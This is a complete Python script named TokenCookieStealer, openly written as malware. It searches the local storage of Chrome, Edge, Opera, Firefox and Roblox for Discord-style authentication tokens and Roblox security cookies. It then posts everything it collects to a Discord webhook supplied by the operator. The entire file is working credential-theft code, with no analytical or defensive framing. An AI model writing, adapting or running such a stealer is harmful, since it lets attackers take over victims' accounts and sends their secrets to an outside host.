import os
import json
import re
import requests

class TokenCookieStealer:
    def __init__(self):
        self.webhook_url = input("Enter your Discord webhook URL: ")
        self.browser_paths = {
            'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'),
            'Firefox': os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles'),
            'Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Storage', 'leveldb'),
            'Opera': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
            'Roblox': os.path.join(os.getenv('APPDATA'), 'Roblox', 'Browser')
        }

        self.tokens = []
        self.cookies = []

    def extract_tokens_from_path(self, path):
        for file_name in os.listdir(path):
            if file_name.endswith('.log') or file_name.endswith('.ldb'):
                with open(os.path.join(path, file_name), 'r', errors='ignore') as file:
                    data = file.read()
                    tokens = re.findall(r'[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}', data)
                    for token in tokens:
                        self.tokens.append(token)

    def extract_cookies_from_path(self, path):
        for file_name in os.listdir(path):
            if file_name.endswith('.txt') or file_name.endswith('.sqlite'):
                with open(os.path.join(path, file_name), 'r', errors='ignore') as file:
                    data = file.read()
                    cookies = re.findall(r'security_cookie=[^\s]*', data)  # Adjust regex as needed
                    for cookie in cookies:
                        self.cookies.append(cookie)

    def extract_tokens_and_cookies(self):
        for browser, path in self.browser_paths.items():
            if os.path.exists(path):
                self.extract_tokens_from_path(path)
                if browser == 'Roblox':
                    self.extract_cookies_from_path(path)
    
    def send_to_webhook(self):
        payload = {
            "content": f"Tokens:\n{json.dumps(self.tokens, indent=2)}\nCookies:\n{json.dumps(self.cookies, indent=2)}"
        }
        requests.post(self.webhook_url, json=payload)

    def run(self):
        self.extract_tokens_and_cookies()
        self.send_to_webhook()
        print("Data sent to webhook.")

if __name__ == "__main__":
    stealer = TokenCookieStealer()
    stealer.run()
